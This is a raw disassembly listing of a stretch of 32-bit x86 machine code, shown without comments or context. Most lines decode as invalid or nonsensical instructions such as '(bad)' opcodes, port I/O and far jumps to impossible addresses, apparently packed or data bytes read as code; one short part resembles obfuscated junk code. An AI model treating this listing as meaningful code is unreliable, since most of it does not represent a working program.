  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412370
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417e59,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x412368
  404736:	and    DWORD PTR ds:0x41abde,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4245be,0x412378
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417e55,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4245c6,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4245c6,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412370
  404789:	and    DWORD PTR ds:0x415111,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41abd2,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0x448e87ea
  4047be:	retf   
  4047bf:	push   ebx
  4047c0:	jle    0x404840
  4047c2:	jle    0x404842
  4047c4:	fidivr DWORD PTR [edi+0x7e]
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fld    st(2)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [eax]
  4047d5:	push   ss
  4047d6:	or     BYTE PTR [edi],cl
  4047d8:	cmp    ecx,DWORD PTR [edi]
  4047da:	enter  0x3710,0x18
  4047de:	pop    ds
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
  404844:	and    eax,0x70696f0b
  404849:	add    BYTE PTR [ecx],bh
